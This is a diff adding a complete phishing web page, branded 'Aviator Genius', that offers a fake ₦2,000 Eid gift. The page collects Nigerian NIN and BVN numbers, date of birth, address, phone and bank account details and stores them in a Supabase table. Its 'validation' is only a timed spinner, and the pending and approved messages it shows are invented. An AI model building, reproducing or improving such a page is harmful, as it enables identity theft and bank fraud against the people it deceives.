@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EID MUBARAK KYC - Aviator Genius</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="config.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root { 
+            --primary: #007bff; --bg-dark: #02050a; --bg-accent: #0a192f;
+            --card-bg: rgba(10, 20, 35, 0.92); --success: #2ecc71; --error: #ff4d4d; --warning: #fbbf24;
+        }
+
+        body { 
+            background: radial-gradient(circle at center, var(--bg-accent) 0%, var(--bg-dark) 100%);
+            color: white; font-family: 'Segoe UI', sans-serif; min-height: 100vh; margin: 0;
+            display: flex; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: ""; position: absolute; width: 200%; height: 200%; top: -50%; left: -50%;
+            background-image: linear-gradient(rgba(0, 123, 255, 0.05) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(0, 123, 255, 0.05) 1px, transparent 1px);
+            background-size: 50px 50px; transform: rotateX(60deg); z-index: -1; animation: gridMove 20s linear infinite;
+        }
+        @keyframes gridMove { 0% { transform: rotateX(60deg) translateY(0); } 100% { transform: rotateX(60deg) translateY(50px); } }
+
+        .gift-banner {
+            background: linear-gradient(135deg, #f59e0b, #d97706);
+            padding: 15px; border-radius: 20px; margin-bottom: 20px;
+            display: flex; align-items: center; gap: 15px;
+            box-shadow: 0 10px 25px rgba(245, 158, 11, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
+
+        .kyc-card { 
+            background: var(--card-bg); padding: 25px; border-radius: 28px; width: 100%; max-width: 450px; 
+            border: 1px solid rgba(0, 123, 255, 0.2); backdrop-filter: blur(20px);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.8); text-align: center;
+            animation: slideUp 0.6s ease-out;
+        }
+        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+
+        .input-group { margin-bottom: 12px; text-align: left; }
+        .label { font-size: 0.65rem; color: #94a3b8; text-transform: uppercase; margin-bottom: 5px; font-weight: 800; }
+        input { 
+            width: 100%; padding: 14px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.1); 
+            background: rgba(0,0,0,0.3); color: white; outline: none; box-sizing: border-box; font-weight: 600;
+        }
+        input:focus { border-color: var(--primary); background: rgba(0, 123, 255, 0.05); }
+
+        .main-btn { 
+            width: 100%; padding: 18px; background: var(--primary); color: white; border: none; 
+            border-radius: 14px; font-weight: 900; cursor: pointer; margin-top: 15px; text-transform: uppercase;
+            box-shadow: 0 8px 20px rgba(0, 123, 255, 0.3); transition: 0.3s;
+        }
+        .main-btn:active { transform: scale(0.98); }
+
+        .status-box { padding: 25px; border-radius: 20px; font-size: 0.95rem; line-height: 1.5; font-weight: 600; }
+        .yellow-msg { background: rgba(251, 191, 36, 0.1); border: 1px solid var(--warning); color: var(--warning); }
+        .blue-msg { background: rgba(0, 123, 255, 0.1); border: 1px solid var(--primary); color: #fff; }
+
+        .modal-overlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.92);
+            display: none; align-items: center; justify-content: center; z-index: 2000; padding: 20px;
+            backdrop-filter: blur(10px);
+        }
+        .pop-card {
+            background: var(--card-bg); border: 1px solid rgba(255,255,255,0.1); 
+            border-radius: 25px; padding: 30px; width: 100%; max-width: 350px;
+            animation: modalIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes modalIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+
+        #custom-toast {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: var(--error); color: white; padding: 12px 25px; border-radius: 50px;
+            font-weight: bold; font-size: 0.85rem; display: none; z-index: 3000;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.4);
+        }
+    </style>
+</head>
+<body>
+
+    <div id="custom-toast"></div>
+
+    <div class="kyc-card" id="main-content">
+        <div class="gift-banner">
+            <i class="fa-solid fa-gift" style="font-size: 2.5rem; color: white;"></i>
+            <div style="text-align: left; color: white;">
+                <div style="font-weight: 900; font-size: 1.1rem;">EID MUBARAK GIFT</div>
+                <div style="font-size: 0.8rem; opacity: 0.9;">Verify identity to claim <b>₦2,000</b></div>
+            </div>
+        </div>
+
+        <div id="kyc-form">
+            <div class="input-group"><div class="label">NIN Number (11 Digits)</div><input type="number" id="nin" placeholder="Enter NIN"></div>
+            <div class="input-group"><div class="label">BVN Number (11 Digits)</div><input type="number" id="bvn" placeholder="Enter BVN"></div>
+            
+            <p style="font-size: 0.65rem; color: #64748b; margin: 15px 0;">
+                <i class="fa-solid fa-circle-exclamation"></i> PLEASE MAKE SURE ALL DETAILS BELOW IS INLINE WITH YOUR ID PROVIDED ABOVE
+            </p>
+            
+            <div class="input-group"><div class="label">Country</div><input type="text" id="country" value="Nigeria"></div>
+            <div class="input-group"><div class="label">State of Origin</div><input type="text" id="state" placeholder="e.g. Kano"></div>
+            <div class="input-group"><div class="label">Date of Birth</div><input type="text" id="dob" placeholder="DD/MM/YY" maxlength="8"></div>
+            <div class="input-group"><div class="label">Full Name</div><input type="text" id="name" placeholder="As seen on ID"></div>
+            <div class="input-group"><div class="label">Residential Address</div><input type="text" id="address" placeholder="Home Address"></div>
+            <div class="input-group"><div class="label">Phone Number</div><input type="tel" id="phone" placeholder="080..."></div>
+            
+            <button class="main-btn" onclick="startValidation()">Validate & Continue</button>
+        </div>
+    </div>
+
+    <div id="bank-modal" class="modal-overlay">
+        <div class="pop-card" style="border-top: 4px solid var(--success);">
+            <i class="fa-solid fa-building-columns" style="font-size: 2rem; color: var(--success); margin-bottom: 15px;"></i>
+            <h3 style="margin: 0 0 10px 0;">Reward Destination</h3>
+            <p style="font-size: 0.8rem; opacity: 0.7; margin-bottom: 20px;">Where should we send your ₦2,000 bonus?</p>
+            
+            <div class="input-group"><div class="label">Bank Name</div><input type="text" id="bank_name" placeholder="e.g. Kuda Bank"></div>
+            <div class="input-group"><div class="label">Account Number</div><input type="number" id="acc_num"></div>
+            <div class="input-group"><div class="label">Account Holder</div><input type="text" id="acc_holder"></div>
+            
+            <button class="main-btn" style="background: var(--success);" onclick="finalSubmit()">Claim ₦2,000 Reward</button>
+        </div>
+    </div>
+
+    <div id="notice-modal" class="modal-overlay">
+        <div class="pop-card">
+            <i id="notice-icon" class="fa-solid fa-circle-info" style="font-size: 2.5rem; margin-bottom: 15px;"></i>
+            <h3 id="notice-title" style="margin: 0 0 10px 0;">Notice</h3>
+            <p id="notice-text" style="font-size: 0.9rem; opacity: 0.8; margin-bottom: 20px;"></p>
+            <button class="main-btn" onclick="closeNotice()">Understood</button>
+        </div>
+    </div>
+
+<script>
+    const _supa = getClient();
+    const userEmail = localStorage.getItem('user_email');
+    let tempPayload = {};
+
+    window.onload = () => {
+        checkStatus();
+        limitInput('nin', 11);
+        limitInput('bvn', 11);
+        setupDateFormatting();
+    };
+
+    function setupDateFormatting() {
+        const dobInput = document.getElementById('dob');
+        dobInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, ''); 
+            let formattedValue = '';
+            if (value.length > 0) {
+                formattedValue = value.substring(0, 2);
+                if (value.length >= 3) formattedValue += '/' + value.substring(2, 4);
+                if (value.length >= 5) formattedValue += '/' + value.substring(4, 6);
+            }
+            e.target.value = formattedValue;
+        });
+    }
+
+    function limitInput(id, max) {
+        const input = document.getElementById(id);
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length > max) e.target.value = e.target.value.slice(0, max);
+        });
+    }
+
+    function showNotice(title, text, type = 'primary') {
+        const modal = document.getElementById('notice-modal');
+        const icon = document.getElementById('notice-icon');
+        document.getElementById('notice-title').innerText = title;
+        document.getElementById('notice-text').innerText = text;
+        icon.style.color = type === 'error' ? 'var(--error)' : 'var(--primary)';
+        icon.className = type === 'error' ? 'fa-solid fa-triangle-exclamation' : 'fa-solid fa-circle-info';
+        modal.style.display = 'flex';
+    }
+
+    function closeNotice() { document.getElementById('notice-modal').style.display = 'none'; }
+    function showToast(msg) {
+        const t = document.getElementById('custom-toast');
+        t.innerText = msg; t.style.display = 'block';
+        setTimeout(() => t.style.display = 'none', 3000);
+    }
+
+    async function checkStatus() {
+        if (!userEmail) return;
+        const { data } = await _supa.from('kyc_submissions').select('*').eq('user_email', userEmail).maybeSingle();
+        if (data) renderStatus(data);
+    }
+
+    function renderStatus(data) {
+        const content = document.getElementById('main-content');
+        if (data.status === 'PENDING') {
+            content.innerHTML = `<div class="status-box yellow-msg"><i class="fa-solid fa-hourglass-half" style="font-size: 2.5rem; margin-bottom: 15px;"></i><br>Reviewing information (3-5 hours). Bonus will be credited upon approval.</div>`;
+        } else if (data.status === 'APPROVED') {
+            content.innerHTML = `<div class="status-box blue-msg"><i class="fa-solid fa-certificate" style="color:#007bff; font-size: 3rem; margin-bottom: 15px;"></i><br>Verified! Bonus has been sent to your bank account.</div>`;
+        } else if (data.status === 'REJECTED') {
+            if(!document.getElementById('reject-banner')) {
+                const err = document.createElement('div');
+                err.id = 'reject-banner'; err.className = 'status-box';
+                err.style = "color:var(--error); border:1px solid var(--error); margin-bottom:20px; background: rgba(255, 77, 77, 0.1);";
+                err.innerHTML = `<i class="fa-solid fa-triangle-exclamation"></i> Incorrect information. Please recheck and submit again.`;
+                document.getElementById('kyc-form').prepend(err);
+            }
+        }
+    }
+
+    function startValidation() {
+        const fields = ['nin', 'bvn', 'country', 'state', 'dob', 'name', 'address', 'phone'];
+        let allFilled = true;
+        fields.forEach(id => { if (!document.getElementById(id).value.trim()) allFilled = false; });
+
+        if (!allFilled) {
+            showNotice("Empty Fields", "Every field must be filled correctly.", "error");
+            return;
+        }
+
+        const nin = document.getElementById('nin').value;
+        const bvn = document.getElementById('bvn').value;
+        if (nin.length < 11 || bvn.length < 11) {
+            showNotice("Invalid ID", "NIN and BVN must be 11 digits.", "error");
+            return;
+        }
+
+        tempPayload = {
+            user_email: userEmail,
+            full_name: document.getElementById('name').value,
+            nin_number: nin,
+            bvn_number: bvn,
+            country: document.getElementById('country').value,
+            state_origin: document.getElementById('state').value,
+            dob: document.getElementById('dob').value,
+            home_address: document.getElementById('address').value,
+            phone_number: document.getElementById('phone').value
+        };
+
+        document.getElementById('kyc-form').innerHTML = `
+            <div style="text-align:center; padding: 60px 0;">
+                <i class="fa-solid fa-shield-halved fa-spin" style="font-size: 3rem; color: var(--primary);"></i>
+                <p style="margin-top:20px; font-weight: 800; letter-spacing: 1px;">VALIDATING INFORMATION...</p>
+            </div>`;
+
+        setTimeout(() => { document.getElementById('bank-modal').style.display = 'flex'; }, 4000);
+    }
+
+    async function finalSubmit() {
+        const bName = document.getElementById('bank_name').value;
+        const bAcc = document.getElementById('acc_num').value;
+        const bHolder = document.getElementById('acc_holder').value;
+
+        if(!bName || !bAcc || !bHolder) {
+            showToast("Fill all bank details!");
+            return;
+        }
+
+        const finalData = { 
+            ...tempPayload, 
+            bank_name: bName, 
+            account_number: bAcc, 
+            account_holder: bHolder, 
+            status: 'PENDING' 
+        };
+
+        // FIXED: Added onConflict to ensure rejected entries are updated correctly
+        const { error } = await _supa.from('kyc_submissions').upsert(finalData, { onConflict: 'user_email' });
+        
+        if(!error) {
+            document.getElementById('bank-modal').style.display = 'none';
+            checkStatus();
+            setTimeout(() => { location.href='home.html' }, 3500);
+        } else {
+            console.error(error);
+            showNotice("Error", "Could not save details. Please check your connection and try again.", "error");
+            // Reload to reset the form state if it fails
+            setTimeout(() => { location.reload(); }, 3000);
+        }
+    }
+</script>
+</body>
+</html>
